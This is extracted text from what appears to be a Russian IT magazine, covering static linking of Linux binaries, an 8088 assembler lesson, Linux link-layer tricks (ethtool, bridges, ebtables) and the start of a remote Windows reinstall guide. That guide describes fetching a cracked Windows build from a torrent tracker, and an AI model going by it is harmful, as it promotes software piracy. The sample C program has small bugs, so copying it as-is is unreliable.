гих регистра — номер файлового дес криптора, ука затель на буфер с дан‐
ными и размер данных в байтах. Любая функция для записи в файл
или вывода текста на экран (то есть записи в фай лы stdout и stderr с дескрип‐
торами 1 и 2 соответственно) — обертка к этому вызову.
  Самый низкий уровень стандартной биб лиотеки любого языка — набор
оберток  к системным вызовам. Если изменится  ABI  ядра, перестанут
работать все библиотеки. К счастью, в  Linux такого не происходит —
интерфейс системных вызовов исключительно ста билен. Линус Торвальдс
строго следит за соб людением совмести мости и ругается на всех, кто ее
пытается случайно или намеренно сло мать.
   Благодаря такой политике любая программа из времен ядра 2.6 будет
нормально работать и на 5.x, если она не исполь зует никакие раз деляемые
библиотеки.
  Более того, новые программы могут работать на старых ядрах, если
используют только старые системные вызовы.


А что в других системах?
Из распространенных сво бодных Unix‐подоб ных систем Linux — единствен‐
ная с такими гарантиями совместимости ABI ядра.
  Именно поэто му для Linux существу ет множество альтернативных стан‐
дартных библиотек языка C (musl, dietlibc, uclibc, newlib...). По этой же при‐
чине FreeBSD реализует двоичную совместимость с Linux, но не наоборот —
FreeBSD не дает гарантий ста бильности ABI между релизами.
  Поддержка версионирова ния символов  в GNU  libc тоже  нетипична
для реализаций стандартной библиотеки.
   Таким образом, возможнос тей для двоичной совместимости в Linux боль‐
ше, чем во многих других системах, — нужно толь ко ими пользоваться.


Выводы
Из всего сказанного видно, что ста тическая сборка — залог совместимости
с любой системой на основе Linux, причем и с более новыми ядрами, и с
более старыми.
   Альтернативный подход — AppImage тоже поз воляет собрать все в один
файл, но этот файл на деле представляет собой сжатый образ SquashFS
с исполняемым файлом и динамичес кими библиотеками внутри. Увы, инс тру‐
менты автоматического поиска и упа ковки всех нужных библиотек капризны,
и детальное рассмотрение этого подхода не поместится в рамки нашей
статьи. Мы сосредото чимся на статической компоновке.


ПРАКТИКА
Для примера мы используем несложную прог рамму, которая проверяет соот‐
ветствие строки регулярному выражению. Мы соберем ее несколькими раз‐
ными способами и посмотрим, как убедиться, что файл вышел действительно
статический.


Собираем статические файлы с GNU libc
Для работы с регулярными выражениями мы используем биб лиотеку PCRE.
Сохраним следующий код в файл match.c:


#include <stdio.h>
#include <string.h>
#include <pcre.h>


int main(int argc, char** argv) {
    if(argc < 2) {
        fprintf(stderr, "Usage: %s <regex> <string>\n", argv[0]);
        exit(1);
    }


    char* regex = argv[1];
    char* str = argv[2];


    int offsets[1];
    pcre *re;
    int res;
    const char *error;
    int erroffset;


    re = pcre_compile(regex, 0, &error, &erroffset, NULL);
    res = pcre_exec(re, NULL, str, strlen(str), 0, 0, offsets, 1);


    return res;
}

Программа принимает регулярное выражение и про извольную строку. Если
строка соответствует этому выражению, программа завершается с кодом 0.



  $ ./match '^\d+[a‐z]?$' '212850a' && echo yes
  yes


Для начала соберем программу самым «обычным» образом.



  $ gcc ‐o match ‐lpcre ./match.c
  $ ldd ./match
      linux‐vdso.so.1 (0x00007ffc0ec5d000)
      libpcre.so.1 => /lib64/libpcre.so.1 (0x00007fe700e24000)
      libc.so.6 => /lib64/libc.so.6 (0x00007fe700c5a000)
      libpthread.so.0 => /lib64/libpthread.so.0 (0x00007fe700c38000)
      /lib64/ld‐linux‐x86‐64.so.2 (0x00007fe700ed5000)


По умолчанию GCC использует динами чес кую компоновку, поэтому в выводе
команды ldd мы видим зависимость от libpcre.so.
   Если ты хочешь просто проверить, динами чес кий файл или статический,
достаточно и утилиты file.



  $ file ./match
  ./match: ELF 64‐bit LSB executable, x86‐64, version 1 (SYSV), dynamical‐
  ly linked, interpreter /lib64/ld‐linux‐x86‐64.so.2,
  BuildID[sha1]=9e2c84368501419dc6da681aa0f0520950ad896a, for GNU/Linux
  3.2.0, not stripped


Теперь перейдем к статической сборке. Для этого нужно убедиться, что в тво‐
ей системе есть статичес кая версия PCRE. Тра дици онное расширение фай‐
лов статических библиотек — .a. В системах на осно ве Debian большинство
пакетов с библиотеками содержат и ста тичес кую, и динамическую версии.
В системах семейства Red Hat ста тичес кие версии биб лиотек часто живут
в отдельных пакетах. На моей Fedora перед сборкой этого примера нужно
выпол нить sudo dnf install glibc‐static pcre‐static.
   Тонкий момент — при статичес кой сборке порядок сле дования аргумен‐
тов становится важным и файл с программой дол жен идти до всех библиотек.
Наивное добавление опции ‐static к прошлой команде вызовет ошибку.



  $ gcc  ‐o match ‐static ‐lpcre ./match.c
  /usr/bin/ld: /tmp/ccdiyqgc.o: in function 'main':
  match.c:(.text+0x72): undefined reference to 'pcre_compile'
  /usr/bin/ld: match.c:(.text+0xae): undefined reference to 'pcre_exec'
  collect2: error: ld returned 1 exit status


Однако и команда gcc ./match.c ‐o match ‐static ‐lpcre будет не сов‐
сем верной. При динамической компоновке GCC (вернее, GNU ld, которую он
вызвал) сам разоб рался, что libpcre зависит от libpthread (библиоте ки POSIX
threads). Теперь же нам придется ука зать ее вручную. Но с верным набором
и порядком опций мы наконец получим ста тический исполня емый файл.



  $ gcc  ./match.c ‐o match ‐static ‐lpcre ‐lpthread
  $ file ./match
  ./match: ELF 64‐bit LSB executable, x86‐64, version 1 (GNU/Linux), stat‐
  ically linked, BuildID[sha1]=3f816f2c426e417b27de3ac2cf2cfc28ad989889,
  for GNU/Linux 3.2.0, not stripped, too many notes (256)
  $ ldd ./match
      not a dynamic executable



Статическая GNU libc и NSS
В статической версии GNU libc есть серь езный подводный камень — она
не совсем статическая. Дело в том, что биб лиотеки для раз решения сетевых
имен — libnss и ее компоненты — подгру жаются динамически, даже если сам
файл собран статически.
  Для программы из нашего примера это не проблема, поскольку она вовсе
не использует сеть. Не будет это проблемой и для сетевых программ, если
запускать их на системах, где есть GNU libc такой же или более свежей вер‐
сии.
  Однако во встраиваемых системах и образах initrd этот нюанс придется
учитывать. Я сам узнал об этом, когда соб рал образ initrd для загрузки по сети
через PXE и обнаружил, что Wget из BusyBox работает только по IP и не спо‐
собен разрешать имена хос тов.
   Если GNU libc в целевой системе нет, то нужно использовать альтернатив‐
ную стандартную библиотеку языка C.


Альтернативные библиотеки
Одна из самых популярных альтернативных биб лиотек — musl. Ее использует
Alpine Linux. Кроме того, некото рые компиляторы дру гих язы ков предоставля‐
ют опцию связывания с ней вмес то GNU libc. Такая опция есть в Rust и OCaml.
  И в Debian, и в Fedora с вер сии 32 присутству ет пакет musl‐gcc. Он пре‐
доставляет обертку к GCC, которая автомати чес ки использует musl вместо
GNU libc. Использование не отличается от обычного GCC. Простей ший при‐
мер:


musl‐gcc ‐static ‐o hello ./hello.c

Основная сложность подхода в том, что использовать двоичные пакеты
из дистрибутива с такой оберткой не выйдет, если только сам дистрибутив
не использует ее по умолчанию. При дется соб рать библиотеки для нее,
и некоторые могут так и не соб рать ся. Зато и исполняемые файлы на самом
деле не зависят ни от чего, кроме ABI ядра.


ЗАКЛЮЧЕНИЕ
Статическая компоновка, безус ловно, усложня ет сборку, но при этом обес‐
печивает совместимость и с будущими, и с прошлыми версиями ядра Linux.
Так что, если ты хочешь распростра нять свою прог рамму в собранном виде,
эти усилия окупятся.
 КОДИНГ





                                                                                   Антон Карев
                                                                                      Эксперт по информационной
                                                                                            безопасности. Область
                                                                                       профессиональных
                                                                                       интересов — технологическая
                                                                                            разведка, аналитика в сфере
                                                                         ИБ и искусственный
                                                                                                    интеллект
                                                                                                vedacoder@mail.ru




ПОГРУЖЕНИЕ В
ASSEMBLER
 КАК РАБОТАЮТ ПЕРЕМЕННЫЕ,
 РЕЖИМЫ АДРЕСАЦИИ,
 ИНСТРУКЦИИ УСЛОВНОГО
 ПЕРЕХОДА




 На ассемблере ты можешь хранить перемен ные двумя спо‐
 собами: в регис трах и в памяти. С регистрами все понятно.
 А вот с памятью у тебя могут возникнуть проблемы. Тут есть
 подводные камни. Читай дальше, и ты узнаешь, как можно
 размещать переменные и как нельзя, какие бывают режимы
 адресации и как это зна ние поможет тебе кодить на ассем‐
 блере более эффективно.


 После первых двух уроков ты умеешь пользовать ся 16‐битными регистрами
  процессора и их 8‐битными половин ками. Это хорошее начало. Но! Прог‐
 раммируя на ассемблере, очень час то сталкиваешь ся с тем, что нужно нам‐
  ного больше переменных, чем может поместить ся в регис тры процессора.
  Часть переменных приходится хра нить в памяти. Сей час рас скажу, как это
  делать. На примере прог раммы, которая ищет прос тые числа.


 Предыдущие статьи

  • Погружение в assembler
  • Делаем первые шаги в освоении асма
  • Осваиваем арифметические инс трукции




 ГДЕ ДАННЫЕ ХРАНИТЬ МОЖНО, А ГДЕ НЕЛЬЗЯ
 Перед тем как размещать в памяти переменные, разберись, куда их можно
  всовывать, а куда нельзя. Потому что здесь ассемблер тебя никак не контро‐
  лирует. Ты волен размещать переменные всю ду, где только захочешь. Ассем‐
  блер все безропотно скомпилирует, а процес сор все прилежно выполнит.
  Вот только ответственности за пос ледствия они не несут. Вся ответс твен‐
  ность целиком лежит на тебе. Но ты не пугайся! Просто постарайся запом‐
  нить раз и навсегда два спо соба, которы ми раз мещать переменные нельзя,
  и три — которыми можно. Сначала — как нельзя.
   1. Из двух пре дыдущих уроков ты уже зна ешь, что первые 0x100 байтов
    любой программы, скомпилированной в файл с расширени ем .com,
    зарезервированы  операционной  системой.  Всовывать  сюда  свои
    переменные точно не стоит.
   2. Процессор 8088 не отличает данные от кода. Если ты напишешь на ассем‐
    блере вот такой код, процессор радос тно выполнит не только строчки
    с инструкциями, но и строчки с данными — ничуть не переживая о том, что
     от выполнения строчек с данными получается в лучшем слу чае абракадаб‐
     ра, а в худшем программа рушится или зас тревает в бес конечном цикле.





 Никогда  так не  делай!  Когда резервируешь  какую‐то  область памяти
  под переменную, обязательно проследи, чтобы эта область памяти была
  за пределами потока выполнения. Где же такую область найти? Ведь ассем‐
  блерные инструкции, по которым процес сор идет, теоретически могут раз‐
 мещаться в любой ячейке памяти.
    Есть по крайней мере три участка, куда процессор никогда не заглядыва‐
  ет. Вот там и храни свои переменные:
  • после инструкции int 0x20, которую мы ставим в конце программы, что‐
    бы вернуться в командную строку ОС;
  • сразу после безусловного перехода jmp;
  • сразу после инструкции воз вра та ret.


 ПИШЕМ ПОДПРОГРАММУ: ПЕЧАТЬ ЧИСЛА НА ЭКРАНЕ
 В начале статьи об арифметических функциях мы написали библиотеку li‐
  brary.asm с двумя функциями: display_letter (выводит букву на экран)
  и read_keyboard (считыва ет символ с клавиатуры). Сей час для вывода прос‐
  тых чисел на экран нам нужна более продвинутая функция вывода, которая
  выводит не одну букву или цифру, а полноценное чис ло. Давай напишем
  такую функцию (добавь ее в конец файла library.asm).





  Как она работает? Берет из AX число, которое надо вывести на экран. Рекур‐
  сивно делит его на 10. После каждого деления сохраняет остаток на сте ке.
 Доделившись до  нуля, начинает выходить из рекурсии. Перед каждым
 выходом снимает со стека очередной оста ток и выводит его на экран. Уловил
 мысль?
    На всякий случай, если ты с ходу не понял, как работает display_number,
  вот тебе три примера.
    Допустим, AX = 4. Тогда после деления на 10 в AX будет 0, и поэтому dis‐
  play_number не зайдет в рекурсию. Просто выведет остаток, то есть чет‐
  верку, и всё.
    Если AX = 15, то после деления на 10 в AX будет единица. И поэтому под‐
  программа залезет в рекурсию. Покажет там единицу, затем выйдет из внут‐
  реннего вызова в основной и там напеча тает цифру 5.
    Если ты так до конца и не понял, то сделай вот что. Помес ти в AX число
  побольше, скажем 4527, и порабо тай в роли про цес сора: пройди мысленно
  по всем строкам программы. При этом отмечай в блокноте — в обычном
 бумажном блокноте, не на компьютере — каждый свой шаг. Когда в очеред‐
  ной раз заходишь рекурсивно в display_number, отсту пай в блокноте
  на один символ вправо от начала строки. А когда выходишь из рекурсии (инс‐
  трукция ret), отступай на один символ влево.
   И еще: имей в виду, что после того, как display_number выпол нится, в AX
  уже не будет того значения, которое ты туда помес тил перед тем, как выз вать
  подпрограмму.


 ПИШЕМ ПРОГРАММУ ДЛЯ ПОИСКА ПРОСТЫХ ЧИСЕЛ
 Два предварительных шага сделаны: ты уяснил, где переменные размещать
 можно, а где нельзя, и ты написал функцию печати десятичного числа. Теперь
  давай пощупаем всю эту теорию руками. Напишем с тобой программу,
  которая ищет простые числа.
    Напомню, простые числа — это такие, которые делятся только на единицу
  и на себя. Если у них есть другие делители, то такие числа называются сос‐
  тавными. Для поиска прос тых чисел существу ет целая куча алгоритмов. Мы
  воспользуемся одним из них — решетом Эра тосфена. В чем суть алгоритма?
 Он постепенно отфильтровывает  все  числа  за исключением простых.
  Начиная с числа 2 и заканчивая n. Число n зада ешь ты. Как только алгоритм
  натыкается на очередное простое число a, он пробегает по всему списку
 до конца (до n) и вычеркивает из него все числа, которые делятся на a.
 В Википедии есть наглядная анимированная гифка. Пос мотри ее, и сразу
  поймешь, как работает решето Эратос фена.





  Что здесь происходит?
   1. Начинаем с двой ки.
   2. Смотрим: очередное число a помечено как составное? Да — идем
    на шаг 5.
   3. Если не помечено (не вычеркну то), зна чит, a — простое.
   4. Пробегаем по всему спис ку и вычеркива ем все чис ла, которые делятся
    на a .
   5. Инкрементируем текущее число.
   6. Повторяем шаги 2–5, пока не достигли n .

  Каким образом будем бегать по списку и вычеркивать оттуда сос тавные чис‐
  ла? Сначала нам этот список надо создать! При чем в регистры его точно
  втиснуть не получится. Нам потребуется битовый мас сив размером n. По биту
  на каждое число от 2 до n (или вполови ну меньше, если мы оптимизи руем
  алгоритм так, что бы он не видел четные чис ла; это ты можешь сде лать
  в качестве домашнего задания). Соответс твенно, чем больше n, до которого
  ты хочешь найти простое число, тем вмес тительней должен быть мас сив.
    Все понятно? Давай закодим!


 Реализация
 Сначала создаем битовый мас сив и запол няем его нулями. Мы помещаем
 массив по адресу 0x8000. Этот произвольно выб ранный адрес не конфлик‐
  тует с нашим кодом, не пересекается с ним.





 Обрати внимание на квадратные скоб ки вот в этой строчке: mov [bx], al.
  Что они значат? Так мы просим процессор: а скопируй‐ка то значение, что
  хранится в регистре AL, в ячейку памяти, на которую указывает регистр BX.
 И уж точно это не значит, что мы копиру ем зна чение регистра AL в регистр BX.
    Идем дальше. Если очередное число прос тое, выводим его на экран.





  Что тут делаем? Начина ем с двойки (записываем ее AX). Затем заходим
  в цикл и помещаем в BX ука затель на ту ячей ку битового массива, которая
  соответствует числу из регистра AX. Затем смот рим, записан ли там нолик (ты
 же помнишь, мы сначала инициализировали весь массив нулями). Если там
  не ноль, а единица, зна чит, мы на какой‐то из предыдущих итераций уже
  пометили это число как составное. В таком случае пры гаем на @@already_‐
  marked. А если все‐таки ноль, вызываем display_number, чтобы показать
  найденное простое число.
   Обрати внимание на префикс byte в инструкции cmp. Он говорит ассем‐
  блеру о том, что мы сравниваем байты (8‐битные значения), а не слова (16‐
  битные значения).





  Здесь, как и в предыду щем куске кода, сна чала помещаем в BX указатель
  на ту ячейку битового мас сива, которая соответс твует числу из регис тра AX.
 Но только первоначально выполняем инструкцию add дважды. Зачем? Нам
  сейчас нужно не само прос тое число, а те числа, которые делятся на него.
    Перед тем как пометить очередное число как сос тавное, проверяем, что‐
 бы значение регистра BX не выходило за пределы таб лицы: table + table_‐
  size (CoMParsion). Инструкция jnc говорит про цес сору: прыгни, если флаг
  переноса не установлен в единицу (Jump if Not Carry). Ну или если по‐русски:
  прыгни, если левый операнд инс трукции cmp боль ше правого или равен ему.
    Если значение регистра BX все еще находится в пределах битового мас‐
  сива, записываем еди ничку в ту ячей ку памяти, на которую указывает BX.
 Обрати внимание: квадратные скобки в строчке mov byte [bx], 1 означают,
  что мы записываем единицу по адресу, на который указывает BX. Мы здесь
  не присваиваем единицу регистру BX.
   И мы снова используем префикс byte (на этот раз в инструкции mov). Тем
 самым говорим ассемблеру, что присваиваем байт (8 бит), а не слово
  (16 бит).
    Дальше переходим к про верке следующего числа.





  Что тут делаем? Если AX не дос тиг n (пос леднего числа, которое нас инте‐
  ресует), прыгаем на @@next_number и повторя ем там все шаги алгоритма.
   Остался последний штрих: добавь в конец прог раммы строчки из биб‐
  лиотеки library.asm. Вот и всё!
    Если ты переписал весь код правильно, то, когда запус тишь программу,
  получишь список простых чисел. Поэкспериментируй с программой. Под‐
  ставляй разные числа в table_size, и ты увидишь, как список прос тых чисел
  становится короче или длиннее.
   И вот тебе еще домашнее задание: измени программу таким образом,
  чтобы между простыми числами вмес то запятых выводились бай ты 0x0D
  и 0x0A (это значит, что тебе надо будет добавить дополнительный вызов
  для display_letter). Посмотри, что произой дет.


 РАЗБИРАЕМСЯ, КАКИЕ БЫВАЮТ РЕЖИМЫ АДРЕСАЦИИ
 Мы уже много раз использовали конструкцию [bx] в инструкции mov, чтобы
  получить доступ к адресу, который хра нится в BX. В принципе, этого достаточ‐
  но, чтобы создавать в памяти переменные и поль зоваться ими. Ты можешь
  писать что‐то вроде mov [bx], al / mov al, [bx], и будет тебе счастье.
    Но это лишь один из режимов адресации, которые есть у процес‐
  сора 8088. Когда ты раз бира ешь ся, в каких случаях какой режим лучше
  использовать, ты пишешь более эффективные программы. Вот распростра‐
  ненные режимы адресации, которые можно использовать в mov и во всех
 арифметических инструкциях.





  Такие конструкции можно писать и в качес тве левого операнда, и в качес тве
  правого. Обрати внимание на слагаемые d8 и d16. d8 — это 8‐битное сме‐
 щение в диапазоне от –128 до 127. d16 — 16‐битное смещение в диапазоне
  от 0 до 65 535.
   И в чем же преимущество, когда ты знаешь не один режим адресации
   ([bx]), а много? Смотри. Допустим, чтобы прочитать значение из ячейки
  памяти, где хранится нужный элемент массива, тебе необходимо сложить два
  регистра. Если ты кроме [bx] ничего не зна ешь, тебе придется сначала
  задействовать инструкцию add и толь ко потом mov.





 Но когда ты знаешь и дру гие режимы адресации, то, скорее все го, напишешь
  по‐другому, лучше.





 ИНСТРУКЦИИ ПЕРЕХОДА
 До сих пор мы исполь зовали только пять инструкций безусловного и условно‐
  го перехода: jmp, je, jne, jc и jnc. Но про цес сор 8088 поддерживает нам‐
  ного больше инструкций перехода.
    Самое важное, что тебе про них надо помнить, — что у инструкций
  условного перехода действует огра ничение на длину прыжка. Они могут пры‐
  гать только на 128 байт назад и только на 127 байт вперед. Но не переживай.
  Тебе не придется лихора дочно подсчи тывать байты своей программы. Если
  какой‐то из условных перехо дов окажется слишком длинным, nasm сгенери‐
  рует дальний прыжок.





  Вот список инструкций условного перехода, которые поддерживает 8088.





  Большинство из этих инс трукций нап рямую соот носятся с операторами срав‐
  нения в языках высокого уровня.
    Кстати, имей в виду, что некоторые инс трукции процессора, например
  mov, никогда не переключа ют никакие биты регистра флагов. Это значит, что
  их можно встав лять между инс трукцией сравнения и инс трукцией перехода.
 Например, писать что‐то вроде такого.





  Что тут делается? Сравниваем AX с семеркой. Затем помещаем в BX зна‐
  чение 0x2222 — до того как сделать джамп. Если AX = 7, загружаем в BX зна‐
  чение 0x7777. Технически этот кусок кода работает медленнее, чем тот, что
  ниже. Но зато он короче!





  Что выбрать, скорость или лаконичность, решай сам.


 ИТОГИ
  Теперь ты умеешь работать не только с теми переменными, которые хранятся
  в регистрах, но и с теми, которые хра нятся в памяти. Ты знаешь, какие бывают
 режимы адресации, и понимаешь, как выбирать наиболее подходящий. Плюс
  ты познакомился с целой кучей инс трукций условного перехода. С таким
  арсеналом ты уже можешь писать на ассемблере довольно‐таки мощные
  программы!
АДМИН
 ЯДЕРНЫЕ
 ПРИКОЛЫ
    ОСВАИВАЕМ НЕОБЫЧНЫЕ ФИЧИ
     КАНАЛЬНОГО УРОВНЯ В LINUX





                                      Даниил Батурин
                                         Координатор проекта VyOS
                                                      (https://vyos.io), «языковед»,
                                          функциональщик, иногда
                                             сетевой администратор
                                                       daniil@baturin.org





Ядро Linux — осно ва большинства программных маршру‐
тизаторов и файрво лов, и неудивительно — количество фун‐
кций сетевого уров ня в нем огромно. Тем не менее ряд
полезных и необычных функций Linux для работы с каналь‐
ным и физичес ким уровнями часто оста ются в тени. Давай
попробуем компенсировать этот пробел.


ИСПОЛЬЗУЕМ ETHTOOL
Сначала рассмотрим утилиту для общения с сетевы ми картами на самых низ‐
ких уровнях — ethtool.
  С помощью команды ip можно прос мотреть и поменять почти все, что
касается сетевого стека ядра, но, если речь идет об аппаратной части самой
карты, тут без ethtool не обойтись.
  Например, все мы знаем, что MAC‐адрес сетевой карты легко поменять.



  $ ip link show eth0
  2: eth0: <NO‐CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state
  DOWN mode DEFAULT group default qlen 1000
      link/ether 00:08:a2:0a:52:cd brd ff:ff:ff:ff:ff:ff


  $ sudo ip link set dev eth0 address 00:aa:bb:cc:dd:ee


  $ ip link show eth0
  2: eth0: <NO‐CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state
  DOWN mode DEFAULT group default qlen 1000
      link/ether 00:aa:bb:cc:dd:ee brd ff:ff:ff:ff:ff:ff


С точки зрения ядра, у eth0 теперь новый адрес. Оригинальный адрес
остался только в прошивке сетевой карты. В выводе ip его не найти, но eth‐
tool способна заглянуть глуб же.



  $ ethtool ‐‐show‐permaddr eth0
  Permanent address: 00:08:a2:0a:52:cd


Многие сетевые карты поддерживают аппаратное ускорение некоторых фун‐
кций, например вычисление контрольных сумм пакетов TCP и UDP. Прос‐
мотреть  полный  список  функций  и  их  состояние  можно  командой
ethtool ‐‐show‐features <interface>. Обычно все, что поддерживается,
вклю чено по умолчанию, но убедиться не будет лишним.
   Если ты работаешь без физического доступа к оборудованию, наверняка
тебе уже приходилось искать нужный порт. Тра дици онный метод — потушить
порт (sudo ip link set <interface> down) и попросить напарника пос‐
мотреть, какой из портов потух. Но в ряде случаев най ти физическое рас‐
положение порта можно без ущерба для трафика с помощью команды eth‐
tool ‐‐identify <interface>. Она заставляет указанную карту моргать
светодиодом, который отвечает за индикацию up/down. Увы, работает не со
всеми моделями карт — помни, что бывает и ложноотрицательный результат.


«СКРЫТАЯ» ПРОВОДНАЯ СЕТЬ
ARP — фундаментальный про токол сетей  Ethernet, без которого хос ты
не смогут автоматически найти друг друга и уста новить соответствие IP‐
и MAC‐адресов. Но что, если ты специально хочешь сделать так, чтобы сто‐
ронний хост не смог подклю читься к твоей сети?
  Самое правильное решение этой задачи — протокол 802.1x, который
обеспечивает настоящую аутентификацию клиентов. Дру гое, тоже вполне
правильное решение —  настроить  политику  доступа  на  коммутаторе
по белому списку MAC‐адресов.
  Абсурдным  и  достаточно  неожиданным  для  условного  противника
решением было бы отключить ARP. Как ни странно, в Linux это воз можно:
к примеру, отключить его для интерфейса eth0 можно командой sudo ip
link set eth0 arp off.
   Как же хосты найдут друг друга без ARP? В Linux добавить записи в таб‐
лицу ARP можно вручную: ip neighbor add 10.0.0.1 lladdr aa:bb:cc:
dd:ee:ff dev eth0.


ПРОГРАММНЫЕ МОСТЫ В LINUX
В  терминологии  Ethernet  «коммутатор»  (switch)  и  «мост»  (bridge) —
это синонимы. Термин switch придума ли, чтобы отличать многопортовые ком‐
мутаторы от пер вых двухпорто вых мостов. Программные реализации ком‐
мутатора Ethernet по традиции называют мос тами, независимо от числа пор‐
тов.
   Вот и в Linux программный коммутатор называется мостом. Произво‐
дительность таких коммутаторов невысока — ни о каких десяти гигабитах
речь не идет. Кроме того, встроенная функциональность ядра Linux для этой
цели достаточно ограниченна по сравнению с новыми проектами вроде Open
vSwitch. Тем не менее в ряде случаев она может ока заться полезной.
  Объединять два физических сетевых интерфей са в «тупой» мост имеет
смысл только в качестве вынужденной меры, если на объекте нет свободных
портов аппаратного коммутатора, но есть устройство с Linux и неисполь‐
зуемыми сетевыми картами. Осмысленно при менять эту фичу стоит в других
направле ниях.
   Во‐первых, сетевой интерфейс не обязан быть физичес ким — это может
быть и туннель. Некоторые приложения требуют общего широковещатель‐
ного сегмента. Если тебе нужно обеспечить работу таких приложений в уда‐
ленной сети через интернет, ты можешь соединить свои сети туннелем,
который способен инкапсулировать кадры Ethernet. О нас тройке таких тун‐
нелей в Linux я уже писал в статье «Неизвестные туннели Linux. Осваиваем
новые способы строить виртуальные сети»: это GRE, L2TPv3 и VXLAN (а также
OpenVPN в режиме TAP и WireGuard).
   Второй важный момент — программный мост не обязан быть тупым.
В отличие от большинства аппаратных коммутаторов, Linux может выступать
в роли невидимого на сетевом уровне проз рачного файрвола.
  Но для начала вспомним, как делаются мосты.


Возводим мосты
Вернее, не вспомним, а научимся это делать с помощью iproute2. Классичес‐
кая утилита brctl уже давно объявлена устаревшей, вместе с ifconﬁg и прочими
командами из net‐tools, и дистрибутивы Linux начинают их удалять, так что
лучше сразу действовать по‐новому.
  Для примера объединим интерфейсы eth0 и eth1 в мост br0.


$ sudo ip link add name br0 type bridge
$ sudo ip link set dev eth0 master br0
$ sudo ip link set dev eth1 master br0

Удалить интерфейс из мос та можно было бы командой ip link set dev
eth0 nomaster.
   Что в iproute2 хорошо, так это унификация раз ных команд. Когда‐то стан‐
дартным способом прос мотреть информа цию об интерфейсах моста была
команда brctl show.



  $ sudo brctl show br0
  bridge name bridge id            STP enabled interfaces
  br0         8000.0008a20a52cf    no          eth0
                                               eth1


В iproute2 на смену множеству особых случаев пришла общая концепция
ведущего интерфейса (master) и ведомых (slave). Прос мотреть все ведомые
интерфейсы можно командой ip  link  show  master  <interface>. Эта
команда будет работать и для мос та, и для транка LACP, и для всего прочего,
что подразумевает отношения ведущий — ведомый. Единственный недос‐
таток — формат вывода не заточен под конкретный тип интерфейса.



  $ ip ‐‐brief link show master br0
  eth0  UP  9a:a3:32:c1:d6:8b  <BROADCAST,MULTICAST,UP,LOWER_UP>
  eth2  UP  00:08:a2:0a:52:cf  <BROADCAST,MULTICAST,UP,LOWER_UP>



Делаем прозрачный файрвол
Прежде  всего  нужно  убедиться,  что  твое  ядро  не  собрано  с  CON‐
FIG_BRIDGE_NETFILTER=n. Затем — проверить, что установлены в единицу
следующие  опции   sysctl:  net.bridge.bridge‐nf‐call‐iptables,  net.
bridge.bridge‐nf‐call‐ip6tables, net.bridge.bridge‐nf‐call‐arpta‐
bles.
  А теперь хорошая новость: больше ничего особенного делать не потребу‐
ется. Если в ядре есть нужный модуль и его работа не заблокирована опци‐
ями sysctl, то все правила xtables автоматически применяются не только
к маршрутизируемому, но и к коммутиру емому трафику. Для проверки можно
заблокировать поль зователям мос та ICMP: sudo iptables ‐I FORWARD ‐i
br0 ‐p icmp ‐j DROP.


ПОДМЕНЯЕМ MAC ПРОХОДЯЩЕМУ ТРАФИКУ
Пакет ebtables, который предос тавляет файрвол канального уровня, сам
по себе уже экзотика. С его помощью можно реализовать политику доступа
клиентов к коммутатору, если ты вдруг решил сделать из машины с Linux пол‐
ноценный управляемый коммутатор, нес мотря на всю непрактичность этого.
В остальных случаях филь тра ция трафика на сетевом уровне решает все
практические задачи.
  Но однажды мне пот ребова лась совсем уж экзотическая функция и без
того экзотического пакета. Как ни странно, ebtables поддерживает NAT
канального уровня — трансляцию MAC‐адресов источника и назначения.
  Ситуация была следующая: мой коллега хотел отправить отзеркалирован‐
ный трафик с пор та коммутатора в локальный процесс для проведе ния
некоторых тестов. Поскольку тра фик приходил с чужим MAC, ядро никогда
не стало бы его воспринимать как свой. Тут и пригодилась, казалось бы,
абсурдная возможность.


$ sudo ebtables ‐t nat ‐I PREROUTING ‐i eth0 ‐j dnat ‐‐to‐destination
 aa:bb:cc:dd:ee:ff ‐‐dnat‐target ACCEPT

После этого оставалось только заменить IP локаль ным с помощью обычного
NAT.


ЗАКЛЮЧЕНИЕ
Возможности Linux открывают большой простор для самых изощренных кон‐
фигураций на всех уровнях модели OSI. Если внимательно читать докумен‐
тацию, там, как правило, можно найти что‐то на любой, даже самый необыч‐
ный случай.
АДМИН

КОГДА ВИНДА
   НЕ ВИДНА

    ПЕРЕУСТАНАВЛИВАЕМ WINDOWS
       ЧЕРЕЗ УДАЛЕННЫЙ ДОСТУП





Удаленка — тренд этого года. Ока залось,
что многие вещи можно не просто делать
по сети, а делать лучше, чем в офисе.
Думаю, переустановка ОС — достаточно
стандартная операция,  что бы ее можно              Hackcat                                                                        Еще больше котов — на
было перенести на удаленку. И сегодня         https://t.me/meawdreamhackcat.dev@gmail.com
на примере Windows я покажу, как это дела‐
ется.


Как мы все не понаслышке знаем, юзеры час то что‐нибудь ломают, а потом
приносят комп «тыжпрограммисту» с объяснением «я тут что‐то нажал(а),
и все исчезло». Ты поворчишь и полезешь за флешкой со све жей виндой.
   Так это было до лета 2020 года, когда внезап но налетевший вирус все
поломал, а антивирусы не помога ли. Карантин добавил новых трудностей
незадачливым поль зователям, у которых компы от постоянного сидения дома
реже ломаться не стали. Только раньше все проб лемы решал знакомый
айтишник за бутылку пен ного напитка, а сейчас походы могут закончиться
штрафом или больнич ной койкой, так что компьютерная помощь (как и почти
все остальное) переехала на уда ленку.
  И если очистить комп от вирусов еще как‐то удается по сети, то переуста‐
новка ОС обычно проводится при физическом дос тупе. Сегодня я покажу
способ сделать и эту процедуру полностью уда ленной, без инструкций поль‐
зователю, как входить в загрузочное меню и выбирать загрузку с флешки.
Бонусом компьютерный умелец (ты) сэконо мит на транспорте.


           WARNING

                    Описанные  в  статье  методы  могут  привести
                          к необратимому повреждению целевой системы.
                     Попытки проникновения на чужие машины прес‐
                       ледуются по закону. Редак ция не несет ответс‐
                        твенности за любые последствия использования
                    информации из данной статьи.



ПОДГОТОВКА
Чтобы переустановить винду, нам потребуется собс твенно винда в виде ISO‐
образа, программы WinNTSetup и Bootice, удаленное подключение, права
админа и прямые руки.
  Образ можно скачать с сайта Microsoft, но я вместо этого зашел на извес‐
тный русский торрент‐трекер и скачал оттуда актуальную сборку Windows
10 2004 с вырезанным хламом.





                    Таб летку видишь? А она есть!

Если совесть позволя ет, ска чать образ можно прямо на компьютер клиента.
Но можно несколько умень шить объем загрузки и заодно кастомизировать
сборку,   вытащив    из    ISO‐обра за    всего    один   файл  —
install.wim/install.esd, находящий ся в папке sources в кор не образа
(при желании можно его заодно поправить). Для установки, кроме него,
